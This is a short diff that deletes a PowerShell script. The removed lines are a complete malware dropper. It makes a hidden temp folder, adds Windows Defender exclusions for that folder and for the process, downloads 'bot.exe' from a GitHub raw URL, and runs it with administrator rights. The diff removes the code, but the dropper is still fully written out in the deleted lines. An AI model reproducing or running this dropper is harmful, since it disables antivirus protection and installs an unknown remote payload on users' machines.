@@ -1,8 +1,0 @@
-
-$systemPath = [System.IO.Path]::Combine($env:temp, "System")
-New-Item -Path $systemPath -ItemType Directory -Force
-Add-MpPreference -ExclusionPath $systemPath
-
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blackcode2290/test/main/bot.exe" -OutFile [System.IO.Path]::Combine($systemPath, 'file1.exe')
-Add-MpPreference -ExclusionProcess [System.IO.Path]::Combine($systemPath, 'file1.exe')
-Start-Process -FilePath [System.IO.Path]::Combine($systemPath, 'file1.exe') -Verb RunAs
